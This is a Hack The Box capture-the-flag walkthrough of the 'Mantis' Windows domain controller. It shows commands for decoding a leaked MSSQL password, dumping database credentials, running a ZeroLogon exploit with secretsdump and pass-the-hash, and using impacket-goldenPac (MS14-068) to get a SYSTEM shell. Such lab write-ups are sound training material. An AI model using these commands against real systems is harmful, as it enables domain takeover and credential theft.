# HTB - Mantis

#### Ip: 10.10.10.52
#### Name: Mantis
#### Difficulty: Hard

----------------------------------------------------------------------

### Enumeration

I'll kick off enumerating this box with an Nmap scan covering all TCP ports. Here I'll also use the `sC` and `-sV` flags to use basic scripts and to enumerate versions

```text
┌──(ryan㉿kali)-[~/HTB/Mantis]
└─$ sudo nmap -p-  10.10.10.52 -sC -sV 
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-22 16:14 CDT
Nmap scan report for 10.10.10.52
Host is up (0.069s latency).
Not shown: 65508 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Microsoft DNS 6.1.7601 (1DB15CD4) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-08-22 21:16:10Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1337/tcp  open  http         Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS7
|_http-server-header: Microsoft-IIS/7.5
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.10.10.52:1433: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: MANTIS
|     DNS_Domain_Name: htb.local
|     DNS_Computer_Name: mantis.htb.local
|     DNS_Tree_Name: htb.local
|_    Product_Version: 6.1.7601
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-08-22T21:11:58
|_Not valid after:  2053-08-22T21:11:58
|_ssl-date: 2023-08-22T21:17:15+00:00; 0s from scanner time.
| ms-sql-info: 
|   10.10.10.52:1433: 
|     Version: 
|       name: Microsoft SQL Server 2014 RTM
|       number: 12.00.2000.00
|       Product: Microsoft SQL Server 2014
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc        Microsoft Windows RPC
8080/tcp  open  http         Microsoft IIS httpd 7.5
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Tossed Salad - Blog
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc        Microsoft Windows RPC
49161/tcp open  msrpc        Microsoft Windows RPC
49165/tcp open  msrpc        Microsoft Windows RPC
49172/tcp open  msrpc        Microsoft Windows RPC
50255/tcp open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM
| ms-sql-info: 
|   10.10.10.52:50255: 
|     Version: 
|       name: Microsoft SQL Server 2014 RTM
|       number: 12.00.2000.00
|       Product: Microsoft SQL Server 2014
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 50255
|_ssl-date: 2023-08-22T21:17:15+00:00; 0s from scanner time.
| ms-sql-ntlm-info: 
|   10.10.10.52:50255: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: MANTIS
|     DNS_Domain_Name: htb.local
|     DNS_Computer_Name: mantis.htb.local
|     DNS_Tree_Name: htb.local
|_    Product_Version: 6.1.7601
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-08-22T21:11:58
|_Not valid after:  2053-08-22T21:11:58
Service Info: Host: MANTIS; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time: 
|   date: 2023-08-22T21:17:09
|_  start_date: 2023-08-22T21:11:48
| smb-os-discovery: 
|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: mantis
|   NetBIOS computer name: MANTIS\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: mantis.htb.local
|_  System time: 2023-08-22T17:17:07-04:00
| smb2-security-mode: 
|   210: 
|_    Message signing enabled and required
|_clock-skew: mean: 34m17s, deviation: 1h30m43s, median: 0s
```

Definitely looks like we're dealing with a domain controller here. Lets go ahead and add htb.local to `/etc/hosts`

Interestingly, there's a port 1337 here. That's always worth looking into while playing a CTF.

Navigating to the site we find a default IIS7 page:

site.png

Lets use Feroxbuster to scan for directories:

ferox.png

Cool, looks like we've got an `/orchard` directory, as well as a `/secure_notes` directory. Heading over to http://htb.local:1337/secure_notes/ we find two files:

notes.png

Clicking into the dev_notes we find a list. But this bit highlighted here looks like Base64. 

hash.png

Looks like this was Base64 encoded and we'll also need to decode from hex too:

```text
┌──(ryan㉿kali)-[~/HTB/Mantis]
└─$ echo "NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx" | base64 -d              
6d2424716c5f53405f504073735730726421                                                                                                                             
┌──(ryan㉿kali)-[~/HTB/Mantis]
└─$ echo "6d2424716c5f53405f504073735730726421" | xxd -r -p            
m$$ql_S@_P@ssW0rd!                                                                    
```

### Exploitation

Cool, this seems to be a mssql password. Based off the list found in dev_notes, we also know there is an admin user too. 

Lets try the credentials using impacket-mssqlclient:

```text
┌──(ryan㉿kali)-[~/HTB/Mantis]
└─$ impacket-mssqlclient admin:'m$$ql_S@_P@ssW0rd!'@10.10.10.52
```

```text
SQL> SELECT name, database_id, create_date FROM sys.databases;
name                                                                                                                               database_id   create_date   

--------------------------------------------------------------------------------------------------------------------------------   -----------   -----------   

master                                                                                                                                       1   2003-04-08 09:13:36   

tempdb                                                                                                                                       2   2023-08-22 17:11:57   

model                                                                                                                                        3   2003-04-08 09:13:36   

msdb                                                                                                                                         4   2014-02-20 20:49:38   

orcharddb                                                                                                                                    5   2017-09-01 09:31:52
```

The orcharddb looks interesting:

```text
SQL> SELECT * FROM orcharddb.INFORMATION_SCHEMA.TABLES;
```

There was tons of ourput here, but this one specifically caught my eye:

users.png

```text
SELECT * FROM blog_Orchard_Users_UserPartRecord;
```

The format is wonky, but it looks like we've found a plaintext password for user james:

james.png

### ZeroLogon

Because this is such an old box, I tried ZeroLogon and it worked!

(Note: If you're not familiar with ZeroLogon, the folks at CrowdStrike have a nice high-level overview here: https://www.crowdstrike.com/blog/cve-2020-1472-zerologon-security-advisory/ )

```text
┌──(ryan㉿kali)-[~/HTB/Mantis]
└─$ python ~/Tools/AD/zerologon.py MANTIS 10.10.10.52
Performing authentication attempts...
======================================================================================================================================
Target vulnerable, changing account password to empty string

Result: 0

Exploit complete!
```
Now that the DC password has been set to null, I can use impacket-secretsdump to drop the admin hash:

zero.png

And now that we have the administrator hash all we need to do is pass-the-hash to logon:

shell.png

From here we can grab both the user.txt and root.txt flags:

user_flag.png

root_flag.png

### Intented Route - Kerberos

Looking at other writeups for the box, I realized zerologon wasn't the intended method at all. Instead, it seems the box was designed for users to exploit a Kerberos vulnerability (MS14-068), which I knew nothing about.

According to Microsoft:

```text
This security update resolves a privately reported vulnerability in Microsoft Windows Kerberos KDC that could allow an attacker to elevate unprivileged domain user account privileges to those of the domain administrator account. An attacker could use these elevated privileges to compromise any computer in the domain, including domain controllers. An attacker must have valid domain credentials to exploit this vulnerability. The affected component is available remotely to users who have standard user accounts with domain credentials; this is not the case for users with local account credentials only
```

Interesting! Looking around a bit I found that Impacket has a script for this. We can simply run:

```text
┌──(ryan㉿kali)-[~/HTB/Mantis]
└─$ impacket-goldenPac 'htb.local/james:J@m3s_P@ssW0rd!'\@mantis.htb.local 
```

And we get a shell back as nt authority\system:

pac.png

Thanks for following along!

-Ryan